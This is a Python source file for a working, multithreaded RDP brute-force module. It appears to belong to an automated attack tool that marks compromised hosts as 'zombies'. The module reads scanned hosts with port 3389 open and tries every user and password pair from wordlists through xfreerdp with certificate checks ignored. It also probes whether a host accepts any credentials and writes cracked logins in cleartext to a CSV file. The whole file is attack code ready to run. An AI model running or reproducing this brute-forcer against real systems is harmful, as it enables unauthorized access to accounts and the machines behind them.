"""
rdp_connector.py - This script performs a brute force attack on RDP services (port 3389) to find accessible accounts using various user credentials. It logs the results of successful connections.
"""

import os
import csv
import subprocess
import threading
import logging
import time
from queue import Queue, Empty
from shared import SharedData
from logger import Logger
from timeout_utils import (
    subprocess_with_timeout,
    join_threads_with_timeout,
    drain_queue_safely
)

# Configure the logger
logger = Logger(name="rdp_connector.py", level=logging.INFO)

# Define the necessary global variables
b_class = "RDPBruteforce"
b_module = "rdp_connector"
b_status = "brute_force_rdp"
b_port = 3389
b_parent = None

class RDPBruteforce:
    """
    Class to handle the RDP brute force process.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.rdp_connector = RDPConnector(shared_data)
        logger.info("RDPConnector initialized.")

    def bruteforce_rdp(self, ip, port, mac_address='', hostname=''):
        """
        Run the RDP brute force attack on the given IP and port.
        """
        logger.info(f"Running bruteforce_rdp on {ip}:{port}...")
        return self.rdp_connector.run_bruteforce(ip, port, mac_address, hostname)

    def execute(self, ip, port, row, status_key):
        """
        Execute the brute force attack and update status.
        """
        start_time = time.time()
        logger.lifecycle_start("RDPBruteforce", ip, port)
        logger.info(f"Executing RDPBruteforce on {ip}:{port}...")
        self.shared_data.bjornorch_status = "RDPBruteforce"
        # Extract hostname and MAC from the row passed by orchestrator
        hostname = row.get('Hostnames', '')
        mac_address = row.get('MAC Address', '')
        try:
            success, results = self.bruteforce_rdp(ip, port, mac_address, hostname)
            status = 'success' if success else 'no_creds_found'
        except Exception as e:
            logger.error(f"RDP bruteforce error for {ip}: {e}")
            status = 'error'
        finally:
            duration = time.time() - start_time
            logger.lifecycle_end("RDPBruteforce", status, duration, ip)
        return status

class RDPConnector:
    """
    Class to manage the connection attempts and store the results.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.scan = self._load_csv_filtered(shared_data.netkbfile, "3389")

        self.users = open(shared_data.usersfile, "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()

        self.lock = threading.Lock()
        self.rdpfile = shared_data.rdpfile
        # If the file doesn't exist, it will be created
        if not os.path.exists(self.rdpfile):
            logger.debug(f"Creating {self.rdpfile}")
            with open(self.rdpfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        self.results = []  # List to store results temporarily
        self.queue = Queue()
        self.progress_lock = threading.Lock()
        self.progress_count = 0
        self.progress_total = 0
        # Track IPs that don't require authentication
        self.no_auth_ips = {}
        self.no_auth_lock = threading.Lock()

    def _load_csv_filtered(self, filepath, port_filter):
        """Load CSV and filter rows containing the specified port."""
        rows = []
        if os.path.exists(filepath):
            with open(filepath, 'r', newline='') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    ports = row.get("Ports", "")
                    if ports and port_filter in ports:
                        rows.append(row)
        return rows

    def load_scan_file(self):
        """
        Load the netkb file and filter it for RDP ports.
        """
        self.scan = self._load_csv_filtered(self.shared_data.netkbfile, "3389")

    def _get_sfreerdp_env(self):
        """Get sfreerdp path and environment prefix for OPENSSL_MODULES."""
        script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        bin_dir = os.path.join(script_dir, "bin")
        sfreerdp_path = os.path.join(bin_dir, "sfreerdp")

        # Fall back to system xfreerdp if bundled not found
        if not os.path.exists(sfreerdp_path):
            sfreerdp_path = "xfreerdp"
            bin_dir = None

        env_prefix = f"OPENSSL_MODULES={bin_dir} " if bin_dir else ""
        return sfreerdp_path, env_prefix

    def check_no_auth(self, adresse_ip):
        """
        Check if RDP accepts any credentials (no authentication required).
        Tests with obviously wrong credentials - if it succeeds, auth is disabled.
        """
        sfreerdp_path, env_prefix = self._get_sfreerdp_env()
        # Use random invalid credentials to test if auth is disabled
        command = f"{env_prefix}{sfreerdp_path} /v:{adresse_ip} /u:__noauth_test__ /p:__invalid__ /cert:ignore +auth-only"
        try:
            stdout, stderr, returncode = subprocess_with_timeout(command, timeout=15)
            # If garbage credentials succeed, no auth is required
            return self._check_rdp_auth_success(stdout, stderr, returncode)
        except TimeoutError:
            return False
        except subprocess.SubprocessError:
            return False

    def _check_rdp_auth_success(self, stdout, stderr, returncode):
        """
        Check if RDP authentication succeeded based on output patterns.
        Works with both real Windows RDP and NLA mock servers.

        Success indicators:
        - returncode 0: Full CredSSP success (Windows RDP)
        - "exit status 0" in output: Full CredSSP success
        - "Could not verify public key": NTLM auth passed (mock server - creds valid)
        """
        output = stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')

        # Check for explicit failure indicators FIRST
        if "STATUS_LOGON_FAILURE" in output:
            return False

        if returncode == 0:
            return True

        # Full CredSSP success - must be exactly "exit status 0" not "exit status 0x..."
        if "Authentication only, exit status 0\n" in output or output.endswith("exit status 0"):
            return True

        # NTLM auth succeeded but pubKeyAuth failed (mock server)
        # This means credentials are valid, just pubKeyAuth verification failed
        if "Could not verify public key" in output:
            return True

        return False

    def rdp_connect(self, adresse_ip, user, password):
        """
        Attempt to connect to an RDP service using the given credentials.
        Uses bundled sfreerdp in bin/ directory with +auth-only flag.
        Sets OPENSSL_MODULES to load legacy provider for MD4/NTLM support.
        """
        sfreerdp_path, env_prefix = self._get_sfreerdp_env()
        command = f"{env_prefix}{sfreerdp_path} /v:{adresse_ip} /u:{user} /p:{password} /cert:ignore +auth-only"
        try:
            stdout, stderr, returncode = subprocess_with_timeout(command, timeout=15)
            return self._check_rdp_auth_success(stdout, stderr, returncode)
        except TimeoutError:
            logger.lifecycle_timeout("RDPBruteforce", "sfreerdp auth", 15, adresse_ip)
            return False
        except subprocess.SubprocessError as e:
            return False

    def worker(self, success_flag):
        """
        Worker thread to process items in the queue.
        Uses graceful shutdown pattern with timeout on queue.get().
        """
        while True:
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break
            try:
                item = self.queue.get(timeout=1.0)
            except Empty:
                if self.queue.empty():
                    break
                continue

            adresse_ip, user, password, mac_address, hostname, port = item
            try:
                if self.rdp_connect(adresse_ip, user, password):
                    with self.lock:
                        self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                        logger.success(f"Found credentials for IP: {adresse_ip} | User: {user} | Password: {password}")
                        success_flag[0] = True
                    # File I/O outside lock
                    self.save_results()
                    self.removeduplicates()
                    self.shared_data.record_zombie(mac_address, adresse_ip)
            finally:
                self.queue.task_done()
                with self.progress_lock:
                    self.progress_count += 1
                    if self.progress_count % 50 == 0:
                        logger.info(f"Bruteforcing RDP... {self.progress_count}/{self.progress_total}")

    def run_bruteforce(self, adresse_ip, port, mac_address='', hostname=''):
        # Use provided mac_address and hostname from orchestrator (more reliable)
        # Fallback to lookup if not provided
        if not mac_address or not hostname:
            self.load_scan_file()
            for row in self.scan:
                if row.get('IPs') == adresse_ip:
                    if not mac_address:
                        mac_address = row.get('MAC Address', '')
                    if not hostname:
                        hostname = row.get('Hostnames', '')
                    break

        # Check if RDP doesn't require authentication (accepts any password)
        logger.info(f"Checking if RDP on {adresse_ip} requires authentication...")
        if self.check_no_auth(adresse_ip):
            logger.warning(f"RDP on {adresse_ip} does not require authentication - accepts any password!")
            with self.lock:
                self.results.append([mac_address, adresse_ip, hostname, "[ANY]", "[NO AUTH REQUIRED]", port])
            self.save_results()
            self.removeduplicates()
            self.shared_data.record_zombie(mac_address, adresse_ip)
            with self.no_auth_lock:
                self.no_auth_ips[adresse_ip] = True
            return True, self.results  # Return success - we logged the no-auth finding

        total_tasks = len(self.users) * len(self.passwords)
        self.progress_total = total_tasks
        self.progress_count = 0

        for user in self.users:
            for password in self.passwords:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                    return False, []
                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))

        success_flag = [False]
        threads = []

        logger.info(f"Bruteforcing RDP on {adresse_ip}... (0/{total_tasks})")

        for _ in range(self.shared_data.worker_threads):  # Configurable via shared_config.json
            t = threading.Thread(target=self.worker, args=(success_flag,))
            t.start()
            threads.append(t)

        # Wait for queue with exit signal checking
        queue_timeout = self.shared_data.bruteforce_queue_timeout
        queue_start = time.time()
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping bruteforce.")
                drain_queue_safely(self.queue)
                break
            if time.time() - queue_start > queue_timeout:
                logger.lifecycle_timeout("RDPBruteforce", "queue processing", queue_timeout, adresse_ip)
                drain_queue_safely(self.queue)
                break
            time.sleep(0.5)

        # Give workers time to finish current items
        time.sleep(2)

        # Join threads with timeout
        hanging = join_threads_with_timeout(threads, timeout=10, logger=logger)
        if hanging:
            logger.warning(f"RDP bruteforce: {len(hanging)} threads did not terminate cleanly")

        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful

    def save_results(self):
        """
        Save the results of successful connection attempts to a CSV file.
        """
        # Ensure file exists with header
        if not os.path.exists(self.rdpfile):
            with open(self.rdpfile, 'w', newline='') as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        with open(self.rdpfile, 'a', newline='') as f:
            writer = csv.writer(f)
            for row in self.results:
                writer.writerow(row)
        self.results = []  # Reset temporary results after saving

    def removeduplicates(self):
        """
        Remove duplicate entries from the results CSV file.
        """
        rows = []
        header = None
        if os.path.exists(self.rdpfile):
            with open(self.rdpfile, 'r', newline='') as f:
                reader = csv.reader(f)
                header = next(reader, None)
                seen = set()
                for row in reader:
                    key = tuple(row)
                    if key not in seen:
                        seen.add(key)
                        rows.append(row)

        with open(self.rdpfile, 'w', newline='') as f:
            writer = csv.writer(f)
            if header:
                writer.writerow(header)
            writer.writerows(rows)

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        rdp_bruteforce = RDPBruteforce(shared_data)
        logger.info("Starting RDP attack on port 3389...")

        # Load the netkb file and get the IPs to scan
        ips_to_scan = shared_data.read_data()

        # Execute the brute force on each IP
        for row in ips_to_scan:
            ip = row["IPs"]
            logger.info(f"Executing RDPBruteforce on {ip}...")
            rdp_bruteforce.execute(ip, b_port, row, b_status)

        logger.info(f"Total number of successes: {len(rdp_bruteforce.rdp_connector.results)}")
        exit(len(rdp_bruteforce.rdp_connector.results))
    except Exception as e:
        logger.error(f"Error: {e}")
